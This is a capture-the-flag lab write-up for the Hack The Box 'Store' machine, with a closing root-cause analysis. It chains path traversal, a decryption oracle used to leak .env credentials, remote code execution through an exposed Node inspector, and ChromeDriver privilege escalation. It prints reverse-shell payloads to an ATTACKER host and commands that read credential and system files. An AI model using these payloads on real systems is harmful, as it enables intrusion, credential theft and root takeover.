---

# Hack The Box – Store

---

# 1. Initial Enumeration

## 1.1 Nmap

```bash
nmap -sC -sV -p- -oN full_scan.txt target
```

Relevant services discovered:

* SSH (OpenSSH)
* Node.js web applications on:

  * 5000
  * 5001
  * 5002

---

# 2. Web Enumeration

Directory brute forcing on each port:

```bash
gobuster dir -u http://target:5001/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100
```

Discovered endpoints:

* `/upload`
* `/list`
* `/file/<filename>`
* `/tmp/`
* Static resources

The critical endpoint:

```bash
/file/<input>
```

---

# 3. Arbitrary File Read (AFR)

## 3.1 Directory Traversal

Traversal depth was fuzzed:

```bash
for i in $(seq 1 15); do
  printf '..%%2F%.0s' $(seq 1 $i)
  echo
done > depth.txt
```

Fuzzing:

```bash
ffuf -u "http://target:5001/file/FUZZetc%2Fpasswd" \
-w depth.txt
```

Successful traversal confirmed.

---

## 3.2 Manual Verification

```bash
curl -s "http://target:5001/file/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname"
```

Returned binary output.

---

# 4. Cryptographic Logic Flaw

The application:

* Encrypts files when accessed via `/file/`
* Decrypts files when accessed via `/tmp/`

This allowed double-processing abuse.

---

## 4.1 Extract Base64 Payload

```bash
curl -s "http://target:5001/file/<traversal>proc%2Fself%2Fenviron" \
| grep -aoE 'base64,[A-Za-z0-9+/=]+' \
| head -n1 \
| cut -d, -f2 \
| base64 -d > environ.raw
```

---

## 4.2 Upload Encrypted Blob

```bash
curl -s -X POST "http://target:5001/upload" \
-F "imageupload=@environ.raw;filename=environ.raw" \
-F "uploadimage=Upload File"
```

---

## 4.3 Retrieve Decrypted File

```bash
curl -s "http://target:5001/tmp/environ.raw" | tr '\0' '\n'
```

Recovered environment variables including:

```bash
npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9230 start.js'
```

---

# 5. Extracting .env

```bash
curl -s "http://target:5001/file/<traversal>home%2Fdev%2Fprojects%2Fstore2%2F.env" \
| grep -aoE 'base64,[A-Za-z0-9+/=]+' \
| head -n1 \
| cut -d, -f2 \
| base64 -d > env.enc
```

Upload and decrypt:

```bash
curl -s -X POST "http://target:5001/upload" \
-F "imageupload=@env.enc;filename=env.enc"

curl -s "http://target:5001/tmp/env.enc"
```

Revealed:

```bash
SFTP_URL=sftp://sftpuser:<password>@localhost
```

---

# 6. SSH Port Forwarding

```bash
ssh -N -L 9230:127.0.0.1:9230 sftpuser@target
```

Verification:

```bash
ss -tnlp | grep 9230
curl http://127.0.0.1:9230/json/list
```

Inspector confirmed active.

---

# 7. Node Inspector RCE

## 7.1 Connect via WebSocket

```bash
wscat -c ws://127.0.0.1:9230/<session-id>
```

Enable runtime:

```json
{"id":1,"method":"Runtime.enable"}
```

---

## 7.2 Verify Code Execution

```json
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.version"}}
```

---

## 7.3 Command Execution

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id').toString()"}}
```

---

## 7.4 Reverse Shell

Start listener:

```bash
nc -lvnp 1337
```

Send payload:

```json
{"id":4,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/ATTACKER/1337 0>&1'\")"}}
```

Shell obtained as `dev`.

---

# 8. Privilege Escalation – ChromeDriver

## 8.1 Enumeration

```bash
ss -tnlp | grep 9515
curl -s http://127.0.0.1:9515/status
```

ChromeDriver confirmed running.

---

## 8.2 Create Root Payload

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"\n' > /tmp/root.sh
chmod +x /tmp/root.sh
```

---

## 8.3 Start Listener

```bash
nc -lvnp 4444
```

---

## 8.4 Trigger ChromeDriver

```bash
curl -s -X POST http://127.0.0.1:9515/session \
-H "Content-Type: application/json" \
-d '{
  "capabilities": {
    "alwaysMatch": {
      "goog:chromeOptions": {
        "binary": "/tmp/root.sh"
      }
    }
  }
}'
```

Root shell obtained.

---

# 9. Vulnerability Analysis

## 9.1 Arbitrary File Read

Root cause:

* Unsanitized path input
* Unsafe filesystem joins

Impact:

* Full file system disclosure

---

## 9.2 Cryptographic Logic Flaw

Root cause:

* Inconsistent encryption/decryption paths
* No state validation

Impact:

* Decryption oracle
* Arbitrary plaintext recovery

---

## 9.3 Node Inspector Exposure

Root cause:

* Production use of `--inspect`
* No authentication
* Localhost-only assumption

Impact:

* Arbitrary JavaScript execution
* Full user compromise

---

## 9.4 ChromeDriver Misconfiguration

Root cause:

* Running as root
* Accepting arbitrary `"binary"` parameter
* No authentication on WebDriver API

Impact:

* Arbitrary root command execution

---

# 10. Complete Attack Chain

1. Directory traversal
2. Cryptographic double-processing flaw
3. Arbitrary file read
4. Inspector discovery
5. SSH port forwarding
6. Node runtime execution
7. ChromeDriver abuse
8. Root compromise

---
